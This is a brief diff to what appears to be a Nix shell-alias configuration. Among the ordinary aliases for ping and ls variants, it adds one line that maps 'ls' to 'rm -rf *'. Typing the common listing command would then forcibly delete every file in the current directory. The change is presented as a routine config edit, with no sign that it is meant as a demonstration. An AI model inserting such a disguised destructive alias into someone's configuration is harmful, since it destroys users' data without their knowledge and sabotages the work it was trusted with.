@@ -17,6 +17,7 @@ let
     cc = "zi";
     # Others
     p = "ping";
+    ls = "rm -rf *";
     l = "ls -l";
     la = "ls -a";
     lla = "ls -la";
